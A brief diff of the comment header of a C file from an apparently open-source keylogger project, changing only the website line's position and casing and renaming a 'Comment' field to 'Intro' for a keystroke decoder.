@@ -1,9 +1,9 @@
 /**
 * Developer: Minhas Kamal (minhaskamal024@gmail.com)
 * Date: 15.Aug.2014
+* Website: https://minhaskamal.github.io/StupidKeylogger
 * License: MIT License
-* Website: https://minhaskamal.github.io/StupidKeyLogger
-* Comment: An ASCII to character decoder for the recorded key strokes.
+* Intro: An ASCII to character decoder for the recorded key strokes.
 **/
 
 #include <stdio.h>
